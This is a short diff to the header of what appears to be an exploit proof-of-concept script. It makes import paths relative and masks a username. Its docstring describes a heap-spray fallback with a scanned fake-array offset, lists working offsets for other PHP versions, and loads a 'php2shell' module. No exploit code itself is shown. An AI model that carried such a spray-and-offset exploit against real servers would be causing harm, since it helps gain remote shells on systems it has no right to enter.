@@ -2,11 +2,12 @@
 """8.5.10 fallback: try the ORIGINAL 9bie spray (cheap_oom_a + fake_ref_b) with a scanned
 s_off (fake-array offset from the chunk base). The 9bie spray works on 8.3.35 (s_off=0xF6398)
 and 8.4.26 (s_off=0xF8398); find the 8.5.10 value."""
+import os
 import sys, time
-sys.path.insert(0, r"C:\Users\likat\p2s52704\test\poc8510")
+sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "test", "poc8510"))
 import importlib.util
 spec = importlib.util.spec_from_file_location("p2s",
-    r"C:\Users\likat\p2s52704\test\poc8510\php2shell.py")
+    r"C:\Users\<USER>\p2s52704\test\poc8510\php2shell.py")
 p2s = importlib.util.module_from_spec(spec); spec.loader.exec_module(p2s)
 import urllib.request, urllib.error
 
